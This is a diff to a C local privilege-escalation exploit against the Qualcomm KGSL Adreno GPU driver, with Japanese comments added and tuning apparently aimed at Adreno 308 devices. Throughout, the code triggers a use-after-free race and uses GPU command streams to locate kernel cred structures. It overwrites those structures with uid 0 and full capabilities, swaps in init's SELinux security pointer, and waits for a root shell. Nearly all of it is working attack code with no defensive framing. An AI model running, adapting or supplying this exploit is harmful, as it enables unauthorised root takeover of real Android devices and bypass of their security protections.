@@ -1,4 +1,3 @@
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -23,13 +22,39 @@
 
 #define KGSL_IOC_TYPE 0x09
 
-/* Corrected ioctl numbers based on kgsl_ioctl_funcs[] */
-#define IOCTL_KGSL_GPUOBJ_ALLOC           _IOWR(KGSL_IOC_TYPE, 0x18, struct kgsl_gpuobj_alloc)
-#define IOCTL_KGSL_GPUOBJ_FREE            _IOW(KGSL_IOC_TYPE, 0x19, struct kgsl_gpuobj_free)
-#define IOCTL_KGSL_GPUOBJ_INFO            _IOWR(KGSL_IOC_TYPE, 0x1A, struct kgsl_gpuobj_info)
-#define IOCTL_KGSL_GPUOBJ_IMPORT          _IOWR(KGSL_IOC_TYPE, 0x1B, struct kgsl_gpuobj_import)
-#define IOCTL_KGSL_GPU_COMMAND            _IOWR(KGSL_IOC_TYPE, 0x1D, struct kgsl_gpu_command)
-#define IOCTL_KGSL_DRAWCTXT_CREATE        _IOWR(KGSL_IOC_TYPE, 0x06, struct kgsl_drawctxt_create)
+/* 複数の候補を試せるようにマクロを定義（デフォルトは 0x18） */
+// #define USE_IOCTL_0x18
+// #define USE_IOCTL_0x2A
+#define USE_IOCTL_0x45  // 元の PoC で使われていた番号（大抵は範囲外だが念のため）
+
+#ifdef USE_IOCTL_0x18
+#define IOCTL_NR_GPUOBJ_ALLOC 0x18
+#define IOCTL_NR_GPUOBJ_FREE  0x19
+#define IOCTL_NR_GPUOBJ_INFO  0x1A
+#define IOCTL_NR_GPUOBJ_IMPORT 0x1B
+#define IOCTL_NR_GPU_COMMAND  0x1D
+#elif USE_IOCTL_0x2A
+#define IOCTL_NR_GPUOBJ_ALLOC 0x2A
+#define IOCTL_NR_GPUOBJ_FREE  0x2B
+#define IOCTL_NR_GPUOBJ_INFO  0x2C
+#define IOCTL_NR_GPUOBJ_IMPORT 0x2D
+#define IOCTL_NR_GPU_COMMAND  0x2E
+#else // USE_IOCTL_0x45 (元の値)
+#define IOCTL_NR_GPUOBJ_ALLOC 0x45
+#define IOCTL_NR_GPUOBJ_FREE  0x46
+#define IOCTL_NR_GPUOBJ_INFO  0x47
+#define IOCTL_NR_GPUOBJ_IMPORT 0x48
+#define IOCTL_NR_GPU_COMMAND  0x4A
+#endif
+
+#define IOCTL_KGSL_GPUOBJ_ALLOC   _IOWR(KGSL_IOC_TYPE, IOCTL_NR_GPUOBJ_ALLOC, struct kgsl_gpuobj_alloc)
+#define IOCTL_KGSL_GPUOBJ_FREE    _IOW(KGSL_IOC_TYPE, IOCTL_NR_GPUOBJ_FREE, struct kgsl_gpuobj_free)
+#define IOCTL_KGSL_GPUOBJ_INFO    _IOWR(KGSL_IOC_TYPE, IOCTL_NR_GPUOBJ_INFO, struct kgsl_gpuobj_info)
+#define IOCTL_KGSL_GPUOBJ_IMPORT  _IOWR(KGSL_IOC_TYPE, IOCTL_NR_GPUOBJ_IMPORT, struct kgsl_gpuobj_import)
+#define IOCTL_KGSL_GPU_COMMAND    _IOWR(KGSL_IOC_TYPE, IOCTL_NR_GPU_COMMAND, struct kgsl_gpu_command)
+
+/* これらの ioctl は通常固定（配列の先頭付近）なので変更しない */
+#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x06, struct kgsl_drawctxt_create)
 #define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x04, struct kgsl_cmdstream_readtimestamp_ctxtid)
 
 struct kgsl_gpuobj_alloc {
@@ -72,32 +97,30 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* Addresses – keep within SVM range (typically 0x60000000 – 0x70000000) */
-#define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL          // 16MB+16KB
-#define OVERLAP_ADDR 0x7001fe000ULL
+/* SVM 範囲（Adreno 308 では通常 0x60000000〜0x70000000）に収める */
+#define UAF_ADDR  0x6001ff000ULL
+#define UAF_SIZE  0x10004000ULL
+#define OVERLAP_ADDR 0x6001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
+#define BOGUS_ADDR 0x600204000ULL
 #define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL   // UAF終端直後
-#define PLACEHOLDER_SIZE 0x10400000ULL    // 16MB+256KB
+#define PLACEHOLDER_ADDR 0x610204000ULL
+#define PLACEHOLDER_SIZE 0x10400000ULL
 
-// vmlinux symbols (pre-KASLR) – adjust for your kernel if needed
 #define VMLINUX_TEXT      0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
 #define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
 #define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
 
-// task_struct cred offset (assuming 64‑bit)
 #define CRED_OFF    0x740
 #define REAL_CRED_OFF 0x738
 
 #define SPRAY_PIDS 2000
-#define SCAN_DWORDS 560  // Cover up to 0x8BF (comm at 0x818, cred at 0x700)
+#define SCAN_DWORDS 560
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
-static volatile int dc_civac_works = -1; /* -1=untested, 0=no, 1=yes */
+static volatile int dc_civac_works = -1;
 
 static void sigill_handler(int sig) { dc_civac_works = 0; }
 
@@ -119,7 +142,10 @@ static void flush_dc_civac_range(void *start, size_t len) {
     for (; p < end; p += 64) try_dc_civac(p);
 }
 
-static void die(const char *msg) { perror(msg); exit(1); }
+static void die(const char *msg) {
+    perror(msg);
+    exit(1);
+}
 
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
@@ -184,7 +210,12 @@ static uint64_t detect_kaslr(void) {
 
 static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
+    unsigned int cmd = IOCTL_KGSL_GPUOBJ_ALLOC;
+    printf("  [DEBUG] gpuobj_alloc: ioctl cmd=0x%08x, nr=%d\n", cmd, _IOC_NR(cmd));
+    if (ioctl(fd, cmd, &a) < 0) {
+        printf("  [DEBUG] gpuobj_alloc failed with errno=%d\n", errno);
+        die("gpuobj_alloc");
+    }
     return a.id;
 }
 
@@ -211,6 +242,7 @@ static void gpuobj_free(int fd, unsigned int id) {
 
 static unsigned int create_context(int fd) {
     struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
+    printf("  [DEBUG] create_context: ioctl cmd=0x%08x\n", IOCTL_KGSL_DRAWCTXT_CREATE);
     if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
     return c.drawctxt_id;
 }
@@ -272,11 +304,16 @@ static void *race_thread(void *arg) {
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
+    // デバイスファイルを開く（/dev/kgsl も試す）
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
+    if (kgsl_fd < 0) {
+        printf("  /dev/kgsl-3d0 failed, trying /dev/kgsl\n");
+        kgsl_fd = open("/dev/kgsl", O_RDWR);
+    }
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    // Detect KASLR before any GPU ops that might affect perf
+    // KASLR 検出（失敗しても続行）
     printf("[*] Phase 0: Early KASLR detection\n");
     uint64_t init_cred_addr = detect_kaslr();
     printf("  init_cred=0x%lX\n", init_cred_addr);
@@ -360,8 +397,7 @@ int main(int argc, char **argv) {
             for (int j = 0; j < 1800; j++) {
                 usleep(200000);
                 if (getuid() == 0) {
-                    // Wait for GPU security pointer write to complete
-                    usleep(50000);  // 50ms for GPU to finish remaining MEM_WRITEs
+                    usleep(50000);
                     pid_t me = getpid();
                     int fd = open("/proc/self/status", O_RDONLY);
                         if (fd >= 0) {
@@ -375,7 +411,6 @@ int main(int argc, char **argv) {
                         close(notify_pipe[1]);
                         usleep(50000);
                         char buf[4096]; int n;
-                        // SELinux context
                         fd = open("/proc/self/attr/current", O_RDONLY);
                         if (fd >= 0) {
                             write(1, "  SELinux: ", 11);
@@ -383,22 +418,18 @@ int main(int argc, char **argv) {
                             write(1, "\n", 1);
                             close(fd);
                         }
-                        // seccomp
                         int sec = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
                         write(1, "  Seccomp: ", 11);
                         char ebuf[32]; int elen = snprintf(ebuf, sizeof(ebuf), "%d\n", sec);
                         write(1, ebuf, elen);
-                        // NO_NEW_PRIVS
                         int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
                         write(1, "  NoNewPrivs: ", 15);
                         elen = snprintf(ebuf, sizeof(ebuf), "%d\n", nnp);
                         write(1, ebuf, elen);
-                        // uid/gid
                         write(1, "  uid=", 6);
                         elen = snprintf(ebuf, sizeof(ebuf), "%d euid=%d gid=%d egid=%d\n",
                             getuid(), geteuid(), getgid(), getegid());
                         write(1, ebuf, elen);
-                        // /proc/self/status key fields
                         fd = open("/proc/self/status", O_RDONLY);
                         if (fd >= 0) {
                             n = read(fd, buf, sizeof(buf)-1);
@@ -434,7 +465,7 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    // ===== Phase 7: GPU scan for task_struct (once) =====
+    // ===== Phase 7: GPU scan =====
     printf("[*] Phase 7: GPU scan for task_structs\n");
 
     unsigned int ctx_id = create_context(kgsl_fd);
@@ -525,7 +556,6 @@ int main(int argc, char **argv) {
             cred_offs[n_cred] = cred_off_found;
             n_cred++;
         }
-        // Scan for task_security_struct: groups of 6 identical dwords
         int sec_hits[64]; int n_sec = 0;
         for (int i = 0; i < SCAN_DWORDS - 6 && n_sec < 64; i++) {
             if (data[i] == data[i+1] && data[i] == data[i+2] &&
@@ -546,12 +576,10 @@ int main(int argc, char **argv) {
     }
     printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);
 
-    // Storage for preserved cred fields (user, user_ns, group_info)
     uint32_t saved_user_lo = 0, saved_user_hi = 0;
     uint32_t saved_user_ns_lo = 0, saved_user_ns_hi = 0;
     uint32_t saved_grp_lo = 0, saved_grp_hi = 0;
 
-    // Dump first cred page content via GPU to verify struct layout
     if (n_cred > 0) {
         printf("[*] Phase 7c: Dumping first cred page for layout verification\n");
         memset(ib_m, 0, 0x10000);
@@ -559,7 +587,6 @@ int main(int argc, char **argv) {
         uint32_t *ccmd = (uint32_t *)ib_m;
         int cdw = 0;
         ccmd[cdw++] = cp_type7(CP_NOP, 0);
-        // Copy 192 bytes (48 dwords) from cred page to DST (covers full cred + more)
         for (int ci = 0; ci < 48; ci++) {
             uint32_t cdl, cdh, csl, csh;
             split64(dst_ga + ci * 4, &cdl, &cdh);
@@ -581,23 +608,21 @@ int main(int argc, char **argv) {
                 printf(" %08X", cd[ci]);
             }
             printf("\n");
-            // Save preserved fields for Phase 8b: user(+0x80), user_ns(+0x88), group_info(+0x90)
             saved_user_lo = cd[32]; saved_user_hi = cd[33];
             saved_user_ns_lo = cd[34]; saved_user_ns_hi = cd[35];
             saved_grp_lo = cd[36]; saved_grp_hi = cd[37];
         }
     }
 
-    // ===== Phase 7e: Test GPU read from kernel VA (init_cred) =====
     uint64_t inc_sec = 0;
     {
         printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
         memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
         uint64_t test_vas[] = {
-            init_cred_addr,            // init_cred
-            init_cred_addr + 0x78,     // init_cred->security
-            0xFFFFFFC000000000ULL,     // PAGE_OFFSET
-            0xFFFFFF8000000000ULL,     // vmalloc base
+            init_cred_addr,
+            init_cred_addr + 0x78,
+            0xFFFFFFC000000000ULL,
+            0xFFFFFF8000000000ULL,
         };
         uint32_t *tcmd = (uint32_t *)ib_m; int tdw = 0;
         tcmd[tdw++] = cp_type7(CP_NOP, 0);
@@ -620,12 +645,11 @@ int main(int argc, char **argv) {
                 uint64_t val = (uint64_t)td[i*2] | ((uint64_t)td[i*2+1] << 32);
                 printf("  KVA[%d]=0x%lX => 0x%016lX\n",
                     i, (unsigned long)test_vas[i], (unsigned long)val);
-                if (i == 1) inc_sec = val;  // init_cred->security
+                if (i == 1) inc_sec = val;
             }
         }
     }
 
-    // ===== Phase 7b: GPU→CPU coherency verification =====
     printf("[*] Phase 7b: GPU→CPU coherency via DST buffer\n");
     {
         uint32_t *cmd = (uint32_t*)ib_m;
@@ -634,12 +658,10 @@ int main(int argc, char **argv) {
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        // Write 0xCAFEBABEDEADBEEF to DST[0..1] via GPU
         split64(dst_ga, &sl, &sh);
         cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
         cmd[dw++] = sl; cmd[dw++] = sh;
         cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
-        // Write 0x9ABCDEF012345678 to DST[8..9]
         split64(dst_ga + 8, &sl, &sh);
         cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
         cmd[dw++] = sl; cmd[dw++] = sh;
@@ -655,12 +677,10 @@ int main(int argc, char **argv) {
             printf("  DST[0]=0x%016llX DST[1]=0x%016llX coherency=%s\n",
                 (unsigned long long)v0, (unsigned long long)v1,
                 (v0 == 0xCAFEBABEDEADBEEFULL &&
-                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" : 
-                 (v0 == 0 ? "FAIL (DST not written)" : "FAIL (wrong value)"));
+                 v1 == 0x9ABCDEF012345678ULL) ? "OK" : "FAIL");
         }
     }
 
-    // ===== Phase 8b: Direct cred overwrite with dump =====
     if (n_cred > 0) {
         printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
         int n_ok = 0;
@@ -670,7 +690,6 @@ int main(int argc, char **argv) {
             uint32_t zl, zh, dl, dh, sl, sh;
             int dw;
 
-            // Read cred page BEFORE to verify security ptr
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             dw = 0;
             cmd[dw++] = cp_type7(CP_NOP, 0);
@@ -689,23 +708,20 @@ int main(int argc, char **argv) {
             __sync_synchronize();
             uint32_t *bd = (uint32_t *)dst_m;
             printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
-                p, bd[31], bd[30], bd[1]);  // +0x78=30,31; +0x04=1
+                p, bd[31], bd[30], bd[1]);
 
             n_ok++;
 
-            // If we successfully read init_cred->security, point cred->security to it
             if (inc_sec != 0) {
                 printf("  Using init_cred->security = 0x%lX for cred[%d]\n",
                     (unsigned long)inc_sec, p);
-                // Write security pointer at +0x78 → inc_sec (init's task_security_struct)
                 split64(cbase + 0x78, &zl, &zh);
-                cmd[dw++] = cp_type7(CP_MEM_WRITE, 4); // addr(2) + data(2)
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
                 cmd[dw++] = zl; cmd[dw++] = zh;
                 split64(inc_sec, &zl, &zh);
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // Write uid=0 + full caps to +0x04..+0x4F (19 dwords = count=21)
             memset(ib_m, 0, 0x10000);
             dw = 0;
             split64(cbase + 0x04, &zl, &zh);
@@ -718,7 +734,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
             cmd[dw++] = 0; cmd[dw++] = 0;
-            // Readback uid
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
             split64(cbase + 0x04, &sl, &sh);
@@ -736,7 +751,6 @@ int main(int argc, char **argv) {
         }
         printf("  Phase 8b: %d creds updated\n", n_ok);
 
-        // Read cred page AFTER to verify security ptr change
         if (n_cred > 0) {
             printf("[*] Phase 8c: Dumping cred page AFTER write\n");
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
@@ -769,9 +783,7 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8d: Cache eviction =====
     printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
-    // Pass 1: mmap eviction (parent L1/L2 → L3)
     void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
     if (ev != MAP_FAILED) {
@@ -781,14 +793,12 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    // ===== Phase 9: Wait for root shell (pipe-based) =====
     printf("[*] Phase 9: Waiting for root shell...\n");
     printf("  parent uid=%u euid=%u\n", getuid(), geteuid());
     fflush(stdout);
 
     close(notify_pipe[1]);
 
-    // Phase 9a: Wait up to 10 seconds for a root notification
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
     if (poll(&pfd, 1, 10000) > 0 &&
@@ -806,7 +816,6 @@ int main(int argc, char **argv) {
     }
     close(notify_pipe[0]);
 
-    // Cleanup - skip gpuobj_free/close to avoid triggering the UAF bug again
     for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
     while (wait(NULL) > 0);
     printf("[*] Done. Goodbye.\n");
